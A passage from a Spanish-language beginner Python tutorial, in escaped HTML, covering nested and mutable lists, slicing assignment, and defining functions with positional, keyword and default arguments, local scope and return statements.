&lt;p&gt;Solo podemos hacer operaciones entre listas, ya que si tratamos de hacer operaciones con otros tipos en este caso un numero &lt;code&gt;int&lt;/code&gt; nos arrojara un error.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;[1, 2, 3] + 4

---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-95-5842ff442cc5&amp;gt; in &amp;lt;module&amp;gt;
----&amp;gt; 1 [1, 2, 3] + 4

TypeError: can only concatenate list (not &quot;int&quot;) to list
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;listas-anidadas&quot;&gt;Listas anidadas&lt;/h2&gt;

&lt;p&gt;Como mencionamos anteriormente, una lista puede contener cualquier tipo de objeto. Esto incluye otra lista. Una lista puede contener sublistas, que a su vez pueden contener sublistas, y así sucesivamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [1, [2, [3, 4], 5], 6]

lista[0]

1

lista[1]

[2, [3, 4], 5]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si queremos acceder a un elemento de una sublista usaremos &lt;code&gt;[][]&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [1, [2, [3, 4], 5], 6]

lista[1][0]

2

lista[1][1]

[3, 4]

lista[1][1][0]

3
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Podemos anidar tantas listas como nuestro sistema soporte&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Es importante mencionar que si usamos &lt;code&gt;operadores&lt;/code&gt; en una &lt;code&gt;lista&lt;/code&gt; con &lt;code&gt;sublistas anidadas&lt;/code&gt;, estos solo se aplicaran a la primera, no lo haran de forma recursiva, y se deseariamos usarlos debemos aplicar el concepto de &lt;code&gt;indexing&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [1, [2, [3, 4], 5], 6]

[3, 4] in lista

False

lista[1]

[2, [3, 4], 5]

[3, 4] in lista[1]

True
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;las-listas-son-mutables&quot;&gt;Las listas son mutables&lt;/h2&gt;

&lt;p&gt;Al contrario que los &lt;code&gt;strings&lt;/code&gt;, los elementos de las &lt;code&gt;listas&lt;/code&gt;si pueden modificarse&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [&quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;]

lista[0]

'texto1'

lista[0] = &quot;texto4&quot;

lista

['texto4', 'texto2', 'texto3']
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si queremos tambien podemos eliminar elementos una &lt;code&gt;lista&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista = [&quot;texto1&quot;, &quot;texto2&quot;, &quot;texto3&quot;]

del lista[0]

lista

['texto2', 'texto3']
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para realizar estas modificaciones tambien podemos usar los conceptos del &lt;code&gt;indexing&lt;/code&gt;, &lt;code&gt;slicing&lt;/code&gt; y &lt;code&gt;stride&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista

['texto1', 'texto2']

lista += [&quot;texto3&quot;, &quot;texto4&quot;, &quot;texto5&quot;]

lista

['texto1', 'texto2', 'texto3', 'texto4', 'texto5']

lista[0:3]

['texto1', 'texto2', 'texto3']

lista[0:3] = [1, 2, 3]

lista

[1, 2, 3, 'texto4', 'texto5']
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Otra cosa interesante es que el numeros de elementos seleccionados no tiene que ser igual a los que se asigne&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lista[0:3]

[1, 2, 3]

lista[0:3] = [1, 2]

lista

[1, 2, 'texto4', 'texto5']

lista[2:2] = [3, 4, 5]

lista

[1, 2, 3, 4, 5, 'texto4', 'texto5']

lista[0:6] = []

lista

['texto5']
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;funciones&quot;&gt;Funciones &lt;a href=&quot;#funciones&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Antes de continuar con el contenido del curso se me hace necesario tocar ya el tema de funciones. Hemos visto distintos tipos de datos anteriormente, pero ahora vamos a profundizar en una de las estructuras principales de &lt;code&gt;python&lt;/code&gt; que son las &lt;code&gt;funciones&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Una función va a consistir en un bloque de código que va encapsular una tarea específica o un grupo de tareas relacionadas. Las funciones nos permiten dividir programas complejos en fragmentos más pequeños y modulares, de manera que podamos volver a utilizar estos fragmentos de codigo en un momento determinado de modo tal que no tenemos que volver a implementarlo.&lt;/p&gt;

&lt;p&gt;En este caso vamos a invocar una función que ya viene definida en &lt;code&gt;python&lt;/code&gt;. Concretamente una que ya vimos antes de nombre &lt;code&gt;len&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar declarando una variable y lo siguiente sera ver como podemos invocar una función.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = &quot;Hola Python&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Para invocar la función debemos de poner el nombre de la función y entre parentesis ponemos los argumentos de la función. Esta función lo que hara es ejecutar una serie de lineas de codigo que estan definidas en alguna parte de &lt;code&gt;python&lt;/code&gt; y nos devuelve el numero de caracteres que contiene nuestra variable.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;len(variable)

11
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora el resultado que nos devuelve la función, podemos asignarlo a otra variable.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;len_variable = len(variable)

print(len_variable)

11
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La función que se muestra anterioremente forma parte de un conjunto de funciones que estan definidas en el interprete de &lt;code&gt;Python&lt;/code&gt; y podemos utilizar siempre que lo necesitemos.&lt;/p&gt;

&lt;p&gt;Para utilizar estas funciones no necesitamos conocer el detalle del código fuente que la implementa, únicamente necesitamos conocer:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Los argumentos recibe la función&lt;/li&gt;
  &lt;li&gt;Los valores que devuelve&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Mas adelante veremos a detalle las funciones integradas de &lt;code&gt;python&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;funciones-personalizadas&quot;&gt;Funciones Personalizadas &lt;a href=&quot;#funciones-personalizadas&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder definir funciones en &lt;code&gt;python&lt;/code&gt; la sintaxis utilizada es la siguiente:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def &amp;lt;nombre_funcion&amp;gt;([&amp;lt;parámetros&amp;gt;]):
    &amp;lt;sentencia(s)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Debemos comenzar utilizando la palabra clave &lt;code&gt;def&lt;/code&gt; despues de un espacio ponemos el &lt;code&gt;nombre_función&lt;/code&gt; que queremos definir y entre &lt;code&gt;()&lt;/code&gt; los parametros que va a recibir nuestra función, la cual se va a traducir a los elementos que le vamos a proporcionar cuando la llamemos.&lt;/p&gt;

&lt;p&gt;El elemento, &lt;code&gt;&amp;lt;sentencia(s)&amp;gt;&lt;/code&gt;, se denomina cuerpo de la función. El cuerpo es el bloque de sentencias en &lt;code&gt;Python&lt;/code&gt; que se ejecutará cuando se llame a la función. Cabe mencionar que el cuerpo de una función de Python se define por la sangría.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar definiendo nuestra función:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;def mi_funcion(argumento1, argumento2):
    print(argumento1)
    print(argumento2)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como podemos visualizar he definico una función de nombre &lt;code&gt;mi_funcion&lt;/code&gt; que va a recibir 2 parametros &lt;code&gt;argumento1 y argumento2&lt;/code&gt; y el codigo que ejecutara sera con &lt;code&gt;print&lt;/code&gt; imprimirme por pantalla primero el &lt;code&gt;argumento1&lt;/code&gt; y segundo el &lt;code&gt;argumento2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Ahora para ejecutarla la función es super sencillo. La sintaxis debe ser la siguiente: &lt;code&gt;&amp;lt;nombre_funcion&amp;gt;([&amp;lt;argumentos&amp;gt;])&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cabe resaltar que Los &lt;code&gt;&amp;lt;argumentos&amp;gt;&lt;/code&gt; son los valores que se pasan a la función. Se corresponden con los &lt;code&gt;&amp;lt;parámetros&amp;gt;&lt;/code&gt; en la definición de la función que asignamos.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Por lo tanto para llamar a la función, deberiamos hacerlo de la siguente manera:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mi_funcion(&quot;Hola Python&quot;, &quot;Adios Python&quot;)

Hola Python
Adios Python
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Es importante mencionar que la ejecución de nuestro programa sera secuencial hasta que llegue a la &lt;code&gt;función&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para entendero mejor, supongamos que estoy defiendo un programa:&lt;/p&gt;

&lt;p&gt;1.- Primero, ejecutar un print(“Curso Python”)
2.- Segundo, llamare a mi función antes declarada, no sin olvidar añadir los parametros que necesita
3.- Tercero, volvere a ejecutar un print(“Aprende Python”)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(&quot;Curso Python&quot;)
mi_funcion(&quot;Hola Python&quot;, &quot;Adios Python&quot;)
print(&quot;Aprendere Python&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como resultado tendre que el interprete de &lt;code&gt;python&lt;/code&gt; comenzara a ejecutar mi programa linea por linea.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;Curso Python
Hola Python
Adios Python
Aprendere Python
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lo que quiero resaltar es que necesitamos crear funciones relacionadas con tareas especificas que realizen una acción particular, de tal modo que podamos volver a reutilizar.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Bueno por si habia duda tambien se pueden definir funciones que no reciban ningún argumento, pero los paréntesis siempre seran necesarios. Tanto en una definición de función como una llamada a una función deben incluir siempre paréntesis, incluso si están vacíos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion2():

    print(&quot;Hola Python&quot;)
    print(&quot;Adios Python&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De tal modo que para ahora llamar a mi función solo debo de poner el nombre de las función y los &lt;code&gt;()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion2()

Hola Python
Adios Python
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;argumentos-de-las-funciones&quot;&gt;Argumentos de las Funciones &lt;a href=&quot;#argumentos-de-las-funciones&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los argumentos que podemos proporcionarle a una función en Python pueden ser de diferentes tipos.&lt;/p&gt;

&lt;h3 id=&quot;argumentos-posicionales&quot;&gt;Argumentos Posicionales&lt;/h3&gt;

&lt;p&gt;Como vimos anteriormente la forma más sencilla de pasar argumentos a una función en &lt;code&gt;Python&lt;/code&gt; es con argumentos posicionales (llamados tambien argumentos requeridos). En la definición de la función, debe especificarse una lista de parámetros separada por comas dentro de los paréntesis.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion(argumento1, argumento2, argumento3):
    print(argumento1)
    print(argumento2)
    print(argumento3)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Los argumentos que le proporcionamos en la invocación de la función debe respetar el orden y el número de parámetros definidos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(&quot;Hola Python&quot;, &quot;Adios Python&quot;, &quot;Grande Python&quot;)

Hola Python
Adios Python
Grande Python
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Si yo trato de llamar a la función, pero en lugar de pasarle los tres argumentos solo le paso dos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(&quot;Hola Python&quot;, &quot;Adios Python&quot;)

---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-12-c560729c0eac&amp;gt; in &amp;lt;module&amp;gt;
----&amp;gt; 1 mi_funcion(&quot;Hola Python&quot;, &quot;Adios Python&quot;)

TypeError: mi_funcion() missing 1 required positional argument: 'argumento3'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como vemos lo que ocurre es que el interprete de &lt;code&gt;python&lt;/code&gt; me dara un error, donde me dira que a la &lt;code&gt;función&lt;/code&gt; que defini previamente con tres argumentos me ha faltado ponerle un elemento posicional correspondiente a &lt;code&gt;argumento3&lt;/code&gt;. Ya que ha identificado un valor para &lt;code&gt;argumento1 y argumento2&lt;/code&gt;, pero no para &lt;code&gt;argumento3&lt;/code&gt;. Y como es un argumento posicional es obligatorio que ponga el mismo numero de argumentos como parametros definamos en nuestra &lt;code&gt;función&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Los parámetros se comportan como variables que estan definidas de manera local a la función (únicamente en el cuerpo de la función). Cuando se invoca la función, los argumentos que se le proporcionan se asignan a los parámetros en el orden en el que estuvieran definidos. Esto quiere decir que los parametros que yo estoy poniendo en la definición de la función se van a comportar como variables dentro del cuerpo de la función, pero no fuera del cuerpo.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Vamos a ver un ejemplo para entender esto mejor:&lt;/p&gt;

&lt;p&gt;Primero voy a definir una función que no recibira ningun argumento, lo que hara sera simplemente crear una variable &lt;code&gt;var&lt;/code&gt; que le asignara una cadena de texto y me lo imprimira por pantalla.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion():
    var = &quot;mi variable 'var' dentro de la funcion&quot;
    print(var)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora voy a definir otra variable con el mismo nombre &lt;code&gt;var&lt;/code&gt; fuera de la función y le voy a asignar una cadena de texto. Seguidamente llamara a mi función previamente creada y finalmente imprimire por pantalla la variable &lt;code&gt;var&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;var = &quot;variable 'var' fuera de mi función&quot;
mi_funcion
print(var)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora al ejecutar esto lo que me muestra es:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable 'var' dentro de la funcion
variable 'var' fuera de la funcion
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como podemos ver lo primero que me imprime el programa es &lt;code&gt;variable 'var' dentro de la funcion&lt;/code&gt; y despues &lt;code&gt;variable 'var' fuera de la funcion&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Esto ocurre por que tanto los parametros y variables que definamos dentro de una &lt;code&gt;función&lt;/code&gt; van a estar en el contexto local de esa &lt;code&gt;función&lt;/code&gt; y no va a afectar a lo que hayamos definido fuera. Por ello aunque yo haya definido una variable con el mismo nombre, para &lt;code&gt;python&lt;/code&gt; son variables diferentes ya que se encuentran en contextos diferentes, una dentro de la función y otra fuera de esta.&lt;/p&gt;

&lt;h3 id=&quot;argumentos-de-palabras-clave&quot;&gt;Argumentos de Palabras Clave&lt;/h3&gt;

&lt;p&gt;Otra manera de invocar una función en &lt;code&gt;Python&lt;/code&gt; es indicando los argumentos de la forma &lt;code&gt;&amp;lt;palabra clave&amp;gt;=&amp;lt;valor&amp;gt;&lt;/code&gt;. En ese caso, cada &lt;code&gt;&amp;lt;palabra clave&amp;gt;&lt;/code&gt; debe coincidir con un parámetro en la definición de la función.&lt;/p&gt;

&lt;p&gt;Veamoslo mejor en un ejemplo para entenderlo bien:&lt;/p&gt;

&lt;p&gt;Comencemos definiendo una función&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion(argumento1, argumento2):
    print(argumento1)
    print(argumento2)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente que hare sera invocar la &lt;code&gt;función&lt;/code&gt; pero en este caso le pasare argumentos de palabra clave en lugar de posicionales.&lt;/p&gt;

&lt;p&gt;Voy a definir dos variables&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable1 = &quot;Hola Python&quot;
variable2 = &quot;Adios Python&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora llamare a mi &lt;code&gt;función&lt;/code&gt;, pero en lugar de pasarle las variables como argumentos posicionales, que seria algo como &lt;code&gt;mi_funcion(variable1, variable2)&lt;/code&gt;. Lo que hare sera indicarle el nombre del parametro que quiero que este asociado con el argumento que le pase.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(argumento1=variable1, argumento2=variable2)

Hola Python
Adios Python
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Si quisiera podria invertirlo y el resultado me lo sacaria alreves.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(argumento1=variable2, argumento2=variable1)

Adios Python
Hola Python
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Una cosa que es importante sobre los &lt;code&gt;argumentos de palabras clave&lt;/code&gt; es que no tenemos que respetar el orden de los parametros para pasarle los argumentos.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Aunque en la definición de nuestra &lt;code&gt;función&lt;/code&gt; pusimos como primer parametro &lt;code&gt;argumento1&lt;/code&gt; y segundo &lt;code&gt;argumento2&lt;/code&gt;. Como yo le digo a que valor estan asignados, puedo cambiar el orden y no necesitamos que esten en el mismo orden que en la definición.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(argumento2=variable1, argumento1=variable2)

Adios Python
Hola Python
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Otra cosa que debemos tener en cuenta es que no podemos poner el nombre de un argumento que no se encuentre definido como parametro de la &lt;code&gt;función&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(argumento1=variable1, argumento3=variable2)

---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-17-96e6349729cf&amp;gt; in &amp;lt;module&amp;gt;
----&amp;gt; 1 mi_funcion(argumento1=variable1, argumento3=variable2)

TypeError: mi_funcion() got an unexpected keyword argument 'argumento3'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Logicamente &lt;code&gt;python&lt;/code&gt; me dara un error ya que el &lt;code&gt;argumento3&lt;/code&gt; no se encuentra en la definición de nuestra &lt;code&gt;función&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;De la misma manera tenemos que respetar el numero de argumentos que le pasamos al invocar nuestra &lt;code&gt;función&lt;/code&gt;. De otra manera este nos dara un error de que falta un argumento posicional.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(argumento1=variable1)

---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-20-c46543542516&amp;gt; in &amp;lt;module&amp;gt;
----&amp;gt; 1 mi_funcion(argumento1=variable1)

TypeError: mi_funcion() missing 1 required positional argument: 'argumento2'
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Otra de las cosas interesantes que nos permite hacer &lt;code&gt;Python&lt;/code&gt;, es la combinación argumentos posicionales y de palabra clave en la misma llamada a una función. En estos casos, siempre los argumentos posicionales deben indicarse primero.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion(argumento1, argumento2):
    print(argumento1)
    print(argumento2)

variable1 = &quot;Hola Python&quot;
variable2 = &quot;Adios Python&quot;


mi_funcion(variable1, argumento2=variable2)

Hola Python
Adios Python
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como podemos ver que efectivamente el programa se nos ejecuta correctamente.&lt;/p&gt;

&lt;p&gt;Pero ahora que pasa si yo pongo el segundo parametro comi posicional.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(argumento1 = variable1, variable2)
    mi_funcion(arg1=var, var2)
                             ^
SyntaxError: positional argument follows keyword argument
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Pues esto me dara un error que me dira que hay un argumento posicional que sigue a un argumento de palabra clave. Entonces necesariamente tiene que ser alreves.&lt;/p&gt;

&lt;h3 id=&quot;parametros-con-valores-por-defecto&quot;&gt;Parametros con Valores por defecto&lt;/h3&gt;

&lt;p&gt;Si especificamos un parámetro en la definición de una función en &lt;code&gt;Python&lt;/code&gt; utilizando la forma &lt;code&gt;&amp;lt;nombre&amp;gt;=&amp;lt;valor&amp;gt;&lt;/code&gt;, entonces &lt;code&gt;&amp;lt;valor&amp;gt;&lt;/code&gt; se convierte en un valor por defecto para ese parámetro. A eso denominamos parametros por defecto.&lt;/p&gt;

&lt;p&gt;Vamos a definir una función, donde le pasaremos dos parametros y que el segundo correspondera a uno por defecto.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion(argumento1, argumento2=&quot;Valor por defecto&quot;):
    print(argumento1)
    print(argumento2)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que me permite es jugar con el numero de argumentos que le paso a la función, ya que esta vez puedo pasarle menos argumentos de los que estan definidos al invocar a la &lt;code&gt;función&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(&quot;Hola Python&quot;)

Hola Python
Valor por defecto
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que hace la función es decir que el primer argumento necesita si o si que me pase un valor, entonces como ya se lo pasamos, esto lo asignara a &lt;code&gt;argumento1&lt;/code&gt; y nos los sacara por pantalla este primer argumento. Ahora en lo que corresponde al segundo parametro si le pasamos algo lo asignara a &lt;code&gt;argumento2&lt;/code&gt;, de lo contrario cogera el valor que tiene por defecto y como en este caso no le pasamos nada lo que hizo fue imprimirnos el valor por defecto.&lt;/p&gt;

&lt;p&gt;Pero si ahora yo le indico un valor. Como esta vez le estamos asignando un valor al &lt;code&gt;argumento2&lt;/code&gt;, esta vez no necesitara el valor por defecto y por lo tanto lo descarta y imprimira el valor que le hayamos pasado.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion(&quot;Hola Python&quot;, &quot;Adios Python&quot;)

Hola Python
Adios Python
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;sentencia-return&quot;&gt;Sentencia Return&lt;/h2&gt;

&lt;p&gt;Las funciones en &lt;code&gt;Python&lt;/code&gt; pueden retornar un valor despues de haber ejecutado las sentencias de código definidas. Para devolver un valor, se debe utilizar la palabra &lt;code&gt;return&lt;/code&gt; dentro del cuerpo de la función.&lt;/p&gt;

&lt;p&gt;Ahora hay que tener en cuenta algunas cosas cuando utilizamos &lt;code&gt;return&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cuando se ejecuta &lt;code&gt;return&lt;/code&gt; en &lt;code&gt;Python&lt;/code&gt;, el intérprete termina inmediatamente la ejecución de la función y regresa a la línea de código desde dónde la hubiésemos invocado.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Vamos a verlo en un ejemplo mas practico.&lt;/p&gt;

&lt;p&gt;Comenzamos definiendo una función simple donde ejecutaremos un &lt;code&gt;print&lt;/code&gt; de un texto, despues usaremos la sentencia &lt;code&gt;return&lt;/code&gt; y finalmente volveremos a ejecutar otro &lt;code&gt;print&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion():
    print(&quot;Sentencia 1 dentro de mi funcion&quot;)
    return
    print(&quot;Sentencia 2 dentro de mi funcion&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora escribiremos codigo fuera de nuestra función, donde primero haremos un &lt;code&gt;print&lt;/code&gt;, despues llamaremos a la &lt;code&gt;función&lt;/code&gt; que creamos y finalmente usaremos otro &lt;code&gt;print&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(&quot;Sentencia 1 fuera de mi funcion&quot;)
mi_funcion()
print(&quot;Sentencia 2 fuera de mi funcion&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ejecutar esto lo que pasara es que se ejecutara la primera linea, despues ejecutara nuestra &lt;code&gt;función&lt;/code&gt;, la cual tiene tres lineas donde se ejecutara la primera linea con normalidad, pero después en la segunda linea al estar la sentencia &lt;code&gt;return&lt;/code&gt;, terminara la ejecución de nuestra &lt;code&gt;función&lt;/code&gt; sin ejecutar la tercera linea y retornara la ejecución a donde se ejecuto la &lt;code&gt;función&lt;/code&gt; y en consecuencia se ejecutara el &lt;code&gt;print&lt;/code&gt; de la ultima linea.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;Sentencia 1 fuera de mi funcion
Sentencia 1 dentro de mi funcion
Sentencia 2 fuera de mi funcion
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;Si definimos la palabra &lt;code&gt;return&lt;/code&gt; de la forma &lt;code&gt;return &amp;lt;valor&amp;gt;&lt;/code&gt; se retornará el &lt;code&gt;&amp;lt;valor&amp;gt;&lt;/code&gt; especificado en la llamada a dicha función.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion():
    return &quot;Valor de la funcion&quot;
    print(&quot;Esta linea nunca podra ejecutarse&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esto nos permite que al invocar nuestra &lt;code&gt;función&lt;/code&gt; podamos recibirla en una variable. Y lo que hara la &lt;code&gt;función&lt;/code&gt; sera ejecutarme el &lt;code&gt;return&lt;/code&gt; y devolverme el resultado en la variable &lt;code&gt;mi_variable&lt;/code&gt;, que en consecuencia al imprimirla me deolvera la cadena de texto que esta asociada al &lt;code&gt;return&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Cabe mencionar que el &lt;code&gt;print&lt;/code&gt; de la &lt;code&gt;función&lt;/code&gt; no se ejecutara debido a que debemos recordar que el &lt;code&gt;return&lt;/code&gt; termina la ejecución de la &lt;code&gt;función&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_variable = mi_funcion()

print(mi_variable)

Valor de la funcion
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tambien podria ejecutar mi &lt;code&gt;función&lt;/code&gt; sin asignarsela a ninguna variable.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion()

Valor de la funcion
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ojito una cosa muy interesante tambien es que podria aplicar a esta &lt;code&gt;función&lt;/code&gt;. Ya que nos devuelve una cadena de texto, podria aplicar conceptos como el de &lt;code&gt;slide&lt;/code&gt;, &lt;code&gt;slicing&lt;/code&gt; y &lt;code&gt;stride&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;mi_funcion()[0:5]

Valor
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;Si no indicamos el término &lt;code&gt;&amp;lt;valor&amp;gt;&lt;/code&gt; en la sentencia &lt;code&gt;return&lt;/code&gt; se devuelve un tipo de datos conocido como &lt;code&gt;None&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion():
    return

variable = mi_funcion()

print(variable)

None
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;Podemos utilizar la sentencia &lt;code&gt;return&lt;/code&gt; para devolver varios valores utilizando la sintaxis &lt;code&gt;return &amp;lt;valor1&amp;gt;,&amp;lt;valor2&amp;gt;,...,&amp;lt;valorn&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Supongamos que definimos una &lt;code&gt;función&lt;/code&gt; que queremos que retorne tres cadenas de texto.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def mi_funcion():
    return &quot;texto1&quot;,&quot;texto2&quot;,&quot;texto3&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y cogeria estos valores, definiendo tres variables e igualandolas a la &lt;code&gt;función&lt;/code&gt;&lt;/p&gt;

